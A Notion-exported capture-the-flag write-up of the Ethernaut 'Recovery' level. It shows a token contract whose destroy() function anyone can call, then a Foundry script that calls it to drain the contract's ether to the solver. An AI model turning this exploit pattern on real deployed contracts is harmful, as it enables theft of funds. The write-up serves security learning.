---
title: "Recovery"
date: "2024-02-24"
lastmod: "2024-02-24T21:53:00.000Z"
draft: false
difficulty: "⭐⭐⭐"
prev: "Preservation-15486d553b7048eba93be9c33dcdd447"
weight: 18
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/17"
next: "Magic-Number-6d707756089b4bb286e3ce6cad62ac5c"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "1efddca3-f4ed-4053-a79c-b06c27873d49"
  created_time: "2024-02-24T13:24:00.000Z"
  last_edited_time: "2024-02-24T21:53:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "aa1cb61f-428e-4dc4-abad-06b3092cb0ce"
        name: "⭐⭐⭐"
        color: "green"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Preservation-15486d553b7048eba93be9c33dcdd447"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Preservation-15486d553b7048eba93be9c33dcdd447"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-24"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 18
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/17"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Magic-Number-6d707756089b4bb286e3ce6cad62ac5c"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Magic-Number-6d707756089b4bb286e3ce6cad62ac5c"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Recovery"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Recovery"
          href: null
  url: "https://www.notion.so/Recovery-1efddca3f4ed4053a79cb06c27873d49"
  public_url: null
UPDATE_TIME: "2024-02-24T21:53:42.156Z"
EXPIRY_TIME: "2024-02-24T22:53:37.410Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


A contract 
creator has built a very simple token factory contract. Anyone can 
create new tokens with ease. After deploying the first token contract, 
the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address.


This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```


Solution:


Here the `INSTANCE_17` address is not the level instance but the token address (you can get it looking at an blockchain explorer)


![](/images/408b0c8a-d185-4064-9186-154d3e914511.png)


An other method would have been to calculate the contract address by hands but this is cumbersome here…


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface SimpleToken {
  function destroy(address payable _to) external;
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_17");
        address pubKey = vm.envAddress("PUBLIC_KEY");

        vm.startBroadcast(deployerPrivateKey);

        SimpleToken simpleToken = SimpleToken(addr);

        console.logUint(addr.balance);

        simpleToken.destroy(payable(pubKey));

        console.logUint(addr.balance);

        vm.stopBroadcast();

    }
}
```

